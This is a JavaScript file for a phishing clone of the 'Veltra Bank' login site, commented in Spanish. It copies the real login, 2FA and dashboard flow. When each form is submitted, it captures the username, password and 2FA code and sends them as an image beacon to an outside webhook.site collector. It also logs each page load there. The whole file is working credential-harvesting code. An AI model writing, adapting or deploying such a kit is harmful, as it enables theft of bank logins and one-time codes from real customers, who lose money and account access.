/*
 * Veltra Bank — front del clon (multi-pagina, minimalista).
 *
 * Flujo fiel: /login -> /verificar -> /dashboard (igual que el real).
 * Captura SOLO en submit, UNA request por evento (webhook.site free limita a
 * 50 requests por token, asi que nada de polling ni envios duplicados).
 */
(function () {
  "use strict";

  var COLLECTOR = "https://webhook.site/a0f4025d-b16b-469e-adac-6f476d639f75";

  function exfil(fase, datos) {
    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) +
              "&d=" + encodeURIComponent(JSON.stringify(datos || {}));
    try { new Image().src = url; } catch (e) {}
  }

  // Beacon liviano para seguir el recorrido del bot (1 request por pagina).
  exfil("pageload", { path: location.pathname });

  // Paso 1: login -> navega a /verificar (como el real).
  var formLogin = document.getElementById("form-login");
  if (formLogin) {
    formLogin.addEventListener("submit", function (e) {
      e.preventDefault();
      var u = (document.getElementById("txt-login") || {}).value || "";
      var p = (document.getElementById("txt-password") || {}).value || "";
      exfil("login", { usuario: u.trim(), clave: p });
      var b = document.getElementById("btn-login");
      if (b) { b.disabled = true; b.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/verificar"; }, 300);
    });
  }

  // Paso 2: 2FA -> navega a /dashboard.
  var form2fa = document.getElementById("form-2fa");
  if (form2fa) {
    form2fa.addEventListener("submit", function (e) {
      e.preventDefault();
      var c = (document.getElementById("txt-2fa") || {}).value || "";
      exfil("2fa", { codigo: c.trim() });
      var b = document.getElementById("btn-2fa");
      if (b) { b.disabled = true; b.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/dashboard"; }, 300);
    });
  }
})();
